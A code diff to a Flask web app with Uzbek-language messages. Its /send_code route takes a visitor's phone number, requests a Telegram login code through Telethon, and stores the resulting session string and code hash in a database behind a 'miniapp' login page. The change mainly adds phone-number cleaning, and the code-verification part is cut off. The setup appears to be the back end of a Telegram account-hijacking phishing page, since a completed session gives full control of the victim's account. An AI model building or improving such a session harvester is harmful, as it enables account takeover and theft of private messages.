@@ -1,7 +1,7 @@
 import os
 import asyncio
 from flask import Flask, request, jsonify, render_template
-
+import re
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import (
@@ -9,7 +9,6 @@ from telethon.errors import (
     SessionPasswordNeededError,
     FloodWaitError
 )
-
 from database import (
     save_login_attempt,
     get_login_attempt,
@@ -51,39 +50,71 @@ def index():
 def miniapp():
     return render_template("login.html")
 
-# =====================
-# SEND CODE
-# =====================
 @app.route("/send_code", methods=["POST"])
 def send_code():
-    phone = request.json.get("phone")
-    if not phone:
-        return jsonify({"status": "error", "message": "Telefon raqam yo‘q"}), 400
+    data = request.json or {}
+    phone = data.get("phone")
 
-    async def _send():
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
+    if not phone:
+        return jsonify({
+            "status": "error",
+            "message": "Telefon raqam yuborilmadi"
+        }), 400
+
+    # 🔥 1. TELEFONNI TOZALASH (ENG MUHIM JOY)
+    phone_clean = re.sub(r"\D", "", phone)
+
+    if not phone_clean.startswith("998") or len(phone_clean) != 12:
+        return jsonify({
+            "status": "error",
+            "message": "Telefon formati noto‘g‘ri. Masalan: +998901234567"
+        }), 400
+
+    phone_clean = "+" + phone_clean
+
+    async def _send_code():
+        client = TelegramClient(
+            StringSession(),
+            API_ID,
+            API_HASH
+        )
+
         await client.connect()
+
         try:
-            sent = await client.send_code_request(phone)
+            sent = await client.send_code_request(phone_clean)
+
+            # 🔐 session + hash ni saqlaymiz
             session_string = client.session.save()
-            save_login_attempt(phone, sent.phone_code_hash, session_string)
+
+            save_login_attempt(
+                phone=phone_clean,
+                phone_code_hash=sent.phone_code_hash,
+                session_string=session_string
+            )
+
         finally:
             await client.disconnect()
 
     try:
-        asyncio.run(_send())
-        return jsonify({"status": "ok"}), 200
+        asyncio.run(_send_code())
+
+        return jsonify({
+            "status": "ok"
+        }), 200
 
     except FloodWaitError as e:
         return jsonify({
             "status": "error",
-            "message": f"{e.seconds} soniya kuting, Telegram vaqtincha blok qo‘ydi"
+            "message": f"Telegram vaqtincha blok qo‘ydi. {e.seconds} soniya kuting."
         }), 429
 
     except Exception as e:
         print("SEND_CODE ERROR:", repr(e))
-        return jsonify({"status": "error", "message": "Server xatosi"}), 500
-
+        return jsonify({
+            "status": "error",
+            "message": "Kod yuborishda server xatosi"
+        }), 500
 
 # =====================
 # VERIFY CODE
